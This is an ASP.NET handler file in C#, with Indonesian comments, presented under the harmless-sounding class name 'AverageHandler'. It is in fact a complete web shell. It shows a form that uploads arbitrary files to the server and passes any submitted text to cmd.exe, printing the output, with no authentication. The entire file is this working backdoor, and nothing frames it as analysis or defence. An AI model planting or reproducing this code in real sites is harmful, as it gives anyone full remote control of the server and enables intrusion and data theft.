<%@ WebHandler Language="C#" Class="AverageHandler" %>

using System;
using System.IO;
using System.Web;

public class AverageHandler : IHttpHandler
{
    /* .Net requires this to be implemented */
    public bool IsReusable
    {
        get { return true; }
    }

    /* Main executing code */
    public void ProcessRequest(HttpContext ctx)
    {
        // Tampilkan formulir untuk upload file
        ctx.Response.Write("<form method='POST' enctype='multipart/form-data'>");
        ctx.Response.Write("Upload file: <input type='file' name='uploadedFile'><br>");
        ctx.Response.Write("Command: <input name='cmd'><input type='submit' value='Submit'>");
        ctx.Response.Write("</form>");
        ctx.Response.Write("<hr>");

        // Jika metode HTTP adalah POST, proses file upload
        if (ctx.Request.HttpMethod == "POST")
        {
            if (ctx.Request.Files.Count > 0)
            {
                HttpPostedFile uploadedFile = ctx.Request.Files["uploadedFile"];
                if (uploadedFile != null && uploadedFile.ContentLength > 0)
                {
                    string uploadPath = ctx.Server.MapPath("~/Uploads"); // Direktori penyimpanan
                    if (!Directory.Exists(uploadPath))
                    {
                        Directory.CreateDirectory(uploadPath);
                    }

                    string filePath = Path.Combine(uploadPath, Path.GetFileName(uploadedFile.FileName));
                    uploadedFile.SaveAs(filePath); // Simpan file

                   ctx.Response.Write("File uploaded successfully: " + filePath + "<br>");
                }
                else
                {
                    ctx.Response.Write("No file uploaded or file is empty.<br>");
                }
            }
        }

        // Eksekusi command jika ada input
        string command = ctx.Request.Form["cmd"];
        if (!string.IsNullOrEmpty(command))
        {
            ctx.Response.Write("<hr>");
            ctx.Response.Write("<pre>");
            try
            {
                var output = ExecuteCommand(command);
                ctx.Response.Write(HttpUtility.HtmlEncode(output));
            }
            catch (Exception ex)
            {
                ctx.Response.Write("Error: " + ex.Message);
            }
            ctx.Response.Write("</pre>");
        }
    }

    private string ExecuteCommand(string command)
    {
        // Eksekusi perintah
        System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + command;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi);
        StreamReader reader = p.StandardOutput;
        string result = reader.ReadToEnd();
        reader.Close();
        return result;
    }
}
